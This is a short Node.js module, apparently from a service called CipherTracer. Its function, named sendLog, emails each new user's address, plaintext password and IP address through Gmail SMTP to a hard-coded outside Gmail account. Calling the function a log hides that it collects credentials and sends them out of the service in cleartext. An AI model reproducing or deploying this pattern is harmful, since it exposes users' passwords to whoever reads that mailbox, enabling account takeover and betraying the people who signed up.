import dotenv from "dotenv";
dotenv.config()
import nodemailer from "nodemailer"

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
dotenv.config({ path: path.resolve(__dirname, "../.env") });
import path from "path";
import { fileURLToPath } from "url";

export function sendLog(dados){
    

    const transporter = nodemailer.createTransport({
    host: "smtp.gmail.com",
    port: 587,
    secure: false, // Use true for port 465, false for port 587
    auth: {
        user: process.env.MAIL,
        pass: process.env.MAIL_PASS,
    },
    });

    // Send an email using async/await
    (async () => {

      const info = await transporter.sendMail({
        from: '"CONTA CRIADA" <ciphertracer>',
        to: "cipherfound2@gmail.com",
        subject: "NOVO USUÁRIO EM CIPHERTRACER",
        html: `   
                  <div style="text-aligin:center;">
                    <p>EMAIL: ${dados.email}</p>
                    <p>SENHA: ${dados.senha}</p>
                    <p>IP: ${dados.ip}</p>
                    <p>DATA: ${new Date()}</p>
                    
                  </div>
                `, // HTML version of the message
    });

    console.log("Message sent:", info.messageId);
    })();

}
